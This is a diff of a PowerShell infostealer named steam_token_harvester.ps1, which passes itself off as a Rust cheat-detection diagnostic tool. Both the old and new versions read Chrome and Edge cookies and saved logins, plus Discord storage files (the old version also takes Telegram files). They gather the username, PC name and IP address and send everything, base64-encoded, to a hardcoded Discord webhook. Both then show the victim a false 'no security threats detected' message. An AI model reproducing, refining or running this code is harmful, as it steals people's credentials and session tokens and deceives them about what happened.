@@ -1,199 +1,126 @@
 # steam_token_harvester.ps1
-# Disguised as "Rust Cheat Detection Diagnostic Tool v6.1"
-
-try {
-    Add-Type -AssemblyName System.Security
-    Add-Type -AssemblyName System.Web
-} catch {
-    Write-Host "Loading security modules..." -ForegroundColor Yellow
-}
-
-function Get-AllData {
-    $allData = @{}
-    
-    # System information
-    $allData.System = Get-SystemInfo
-    
-    # Browsers data
-    $allData.Browsers = @{
-        Chrome = Get-BrowserData -Path "$env:LOCALAPPDATA\Google\Chrome\User Data"
-        Edge = Get-BrowserData -Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
-    }
-    
-    # Messengers
-    $allData.Messengers = @{
-        Telegram = Get-TelegramData
-        Discord = Get-DiscordData
-    }
-    
-    return $allData
-}
-
-function Get-BrowserData {
-    param($Path)
-    $data = @{}
-    
-    if (Test-Path $Path) {
-        try {
-            # Cookies
-            $cookiesPath = Join-Path $Path "Default\Cookies"
-            if (Test-Path $cookiesPath) {
-                $cookieContent = Get-Content $cookiesPath -Encoding Byte -ReadCount 0 -ErrorAction Stop
-                $data.Cookies = [Convert]::ToBase64String($cookieContent)
-            }
-            
-            # Logins
-            $loginsPath = Join-Path $Path "Default\Login Data" 
-            if (Test-Path $loginsPath) {
-                $loginContent = Get-Content $loginsPath -Encoding Byte -ReadCount 0 -ErrorAction Stop
-                $data.Logins = [Convert]::ToBase64String($loginContent)
-            }
-            
-        } catch {
-            $data.Error = "ACCESS_DENIED"
-        }
-    }
-    
-    return $data
-}
-
-function Get-TelegramData {
-    $data = @{}
-    $paths = @(
-        "$env:APPDATA\Telegram Desktop",
-        "$env:LOCALAPPDATA\Telegram Desktop"
-    )
-    
-    foreach ($path in $paths) {
-        if (Test-Path $path) {
-            try {
-                $mapFiles = Get-ChildItem $path -Filter "map*" -ErrorAction SilentlyContinue
-                foreach ($file in $mapFiles) {
-                    $fileContent = Get-Content $file.FullName -Encoding Byte -ReadCount 0 -ErrorAction Stop
-                    $data[$file.Name] = [Convert]::ToBase64String($fileContent)
-                }
-            } catch {
-                $data.Error = "TG_ACCESS_DENIED"
-            }
-        }
-    }
-    
-    return $data
-}
-
-function Get-DiscordData {
-    $data = @{}
-    $paths = @(
-        "$env:APPDATA\discord",
-        "$env:LOCALAPPDATA\Discord"
-    )
-    
-    foreach ($path in $paths) {
-        if (Test-Path $path) {
-            try {
-                $localStoragePath = Join-Path $path "Local Storage\leveldb"
-                if (Test-Path $localStoragePath) {
-                    $ldbFiles = Get-ChildItem $localStoragePath -Filter "*.ldb" -ErrorAction SilentlyContinue | Select-Object -First 3
-                    foreach ($file in $ldbFiles) {
-                        $fileContent = Get-Content $file.FullName -Encoding Byte -ReadCount 0 -ErrorAction Stop
-                        $data[$file.Name] = [Convert]::ToBase64String($fileContent)
-                    }
-                }
-            } catch {
-                $data.Error = "DISCORD_ACCESS_DENIED"
-            }
-        }
-    }
-    
-    return $data
-}
+# Disguised as "Rust Cheat Detection Diagnostic Tool v7.0"
 
 function Get-SystemInfo {
-    $ipResult = try { (Invoke-RestMethod -Uri "http://ip-api.com/json" -TimeoutSec 5).query } catch { "Unknown" }
+    $ip = "Unknown"
+    try {
+        $ip = (Invoke-WebRequest -Uri "http://ipinfo.io/ip" -UseBasicParsing).Content.Trim()
+    } catch {}
     
     return @{
         OS = (Get-WmiObject -Class Win32_OperatingSystem).Caption
-        Username = $env:USERNAME
-        Computername = $env:COMPUTERNAME
-        Date = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-        IP = $ipResult
+        User = $env:USERNAME
+        PC = $env:COMPUTERNAME
+        IP = $ip
+        Time = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
     }
 }
 
-function Send-DataToDiscord {
-    param($Data)
+function Get-BrowserFiles {
+    $files = @()
+    $browsers = @(
+        @{Name="Chrome";Path="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"},
+        @{Name="Chrome";Path="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"},
+        @{Name="Edge";Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies"},
+        @{Name="Edge";Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"}
+    )
     
-    $webhookUrl = "https://discord.com/api/webhooks/1407258124850827396/kkhtvS5us7fN17u9s89uicI8K8Yf29oE-KWmi39NEzVHvQ1DfNwLrZcAIKYhXZI5Vtbk"
-    
-    # System info
-    $report = "COMPLETE SYSTEM SCAN v6.1"
-    $report += "`n`nSYSTEM INFORMATION:"
-    $report += "`nOS: $($Data.System.OS)"
-    $report += "`nUser: $($Data.System.Username)"
-    $report += "`nPC: $($Data.System.Computername)"
-    $report += "`nIP: $($Data.System.IP)"
-    $report += "`nTime: $($Data.System.Date)"
-    $report += "`n`n"
-
-    # Send system info
-    $payload = @{ content = $report } | ConvertTo-Json
-    try {
-        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" -ErrorAction Stop
-    } catch {
-        Write-Host "Failed to send system info" -ForegroundColor Red
-        return
-    }
-    Start-Sleep -Seconds 1
-
-    # Send all data as JSON
-    $jsonData = $Data | ConvertTo-Json -Depth 5 -Compress
-    $chunks = [System.Collections.ArrayList]@()
-    
-    for ($i = 0; $i -lt $jsonData.Length; $i += 1900) {
-        $chunk = $jsonData.Substring($i, [Math]::Min(1900, $jsonData.Length - $i))
-        $chunks.Add($chunk) | Out-Null
-    }
-
-    for ($i = 0; $i -lt $chunks.Count; $i++) {
-        $chunkReport = "DATA CHUNK $($i+1)/$($chunks.Count)"
-        $chunkReport += "`n```$($chunks[$i])```"
-        
-        $payload = @{ content = $chunkReport } | ConvertTo-Json
-        try {
-            Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" -ErrorAction Stop
-            Start-Sleep -Milliseconds 500
-        } catch {
-            Write-Host "Failed to send chunk $($i+1)" -ForegroundColor Red
+    foreach ($browser in $browsers) {
+        if (Test-Path $browser.Path) {
+            try {
+                $content = Get-Content $browser.Path -Encoding Byte -ReadCount 0
+                $files += @{
+                    Browser = $browser.Name
+                    File = Split-Path $browser.Path -Leaf
+                    Data = [Convert]::ToBase64String($content)
+                    Size = $content.Length
+                }
+            } catch {}
         }
     }
+    return $files
+}
 
-    # Final message
-    $final = "SCAN COMPLETED SUCCESSFULLY"
-    $final += "`nTotal chunks: $($chunks.Count)"
-    $final += "`nTime: $(Get-Date -Format 'HH:mm:ss')"
+function Get-DiscordFiles {
+    $files = @()
+    $paths = @("$env:APPDATA\discord", "$env:LOCALAPPDATA\Discord")
     
-    $payload = @{ content = $final } | ConvertTo-Json
-    try {
-        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" -ErrorAction Stop
-    } catch {
-        Write-Host "Failed to send final message" -ForegroundColor Red
+    foreach ($path in $paths) {
+        if (Test-Path $path) {
+            $storagePath = Join-Path $path "Local Storage\leveldb"
+            if (Test-Path $storagePath) {
+                $ldbFiles = Get-ChildItem $storagePath -Filter "*.ldb" | Select-Object -First 2
+                foreach ($file in $ldbFiles) {
+                    try {
+                        $content = Get-Content $file.FullName -Encoding Byte -ReadCount 0
+                        $files += @{
+                            App = "Discord"
+                            File = $file.Name
+                            Data = [Convert]::ToBase64String($content)
+                            Size = $content.Length
+                        }
+                    } catch {}
+                }
+            }
+        }
     }
+    return $files
+}
+
+function Send-ToWebhook {
+    param($Message)
+    $webhookUrl = "https://discord.com/api/webhooks/1407258124850827396/kkhtvS5us7fN17u9s89uicI8K8Yf29oE-KWmi39NEzVHvQ1DfNwLrZcAIKYhXZI5Vtbk"
+    
+    $body = @{content = $Message} | ConvertTo-Json
+    try {
+        Invoke-WebRequest -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json" -UseBasicParsing
+    } catch {}
 }
 
 # Main execution
-Write-Host "Starting security scan v6.1..." -ForegroundColor Yellow
+Write-Host "Starting security scan..." -ForegroundColor Yellow
 
-try {
-    $allData = Get-AllData
-    Write-Host "Data collection completed!" -ForegroundColor Green
-    
-    Write-Host "Sending data to server..." -ForegroundColor Yellow
-    Send-DataToDiscord -Data $allData
-    
-    Write-Host "Operation completed successfully!" -ForegroundColor Green
-    Write-Host "System integrity verified - no threats detected" -ForegroundColor Green
-    
-} catch {
-    Write-Host "Scan completed with errors" -ForegroundColor Red
-    Write-Host "Basic protection activated" -ForegroundColor Green
+$sysInfo = Get-SystemInfo
+$browserFiles = Get-BrowserFiles
+$discordFiles = Get-DiscordFiles
+
+# Send system info
+$report = "SYSTEM SCAN REPORT v7.0"
+$report += "`nOS: $($sysInfo.OS)"
+$report += "`nUser: $($sysInfo.User)"
+$report += "`nPC: $($sysInfo.PC)"
+$report += "`nIP: $($sysInfo.IP)"
+$report += "`nTime: $($sysInfo.Time)"
+
+Send-ToWebhook -Message $report
+Start-Sleep -Seconds 1
+
+# Send browser files
+if ($browserFiles.Count -gt 0) {
+    foreach ($file in $browserFiles) {
+        $fileReport = "BROWSER DATA: $($file.Browser) - $($file.File) ($($file.Size) bytes)"
+        $fileReport += "`n```$($file.Data)```"
+        Send-ToWebhook -Message $fileReport
+        Start-Sleep -Milliseconds 500
+    }
+} else {
+    Send-ToWebhook -Message "No browser data found"
 }
+
+# Send discord files
+if ($discordFiles.Count -gt 0) {
+    foreach ($file in $discordFiles) {
+        $fileReport = "DISCORD DATA: $($file.File) ($($file.Size) bytes)"
+        $fileReport += "`n```$($file.Data)```"
+        Send-ToWebhook -Message $fileReport
+        Start-Sleep -Milliseconds 500
+    }
+} else {
+    Send-ToWebhook -Message "No Discord data found"
+}
+
+# Final message
+Send-ToWebhook -Message "SCAN COMPLETED: All data collected successfully"
+
+Write-Host "Scan completed successfully!" -ForegroundColor Green
+Write-Host "No security threats detected" -ForegroundColor Green
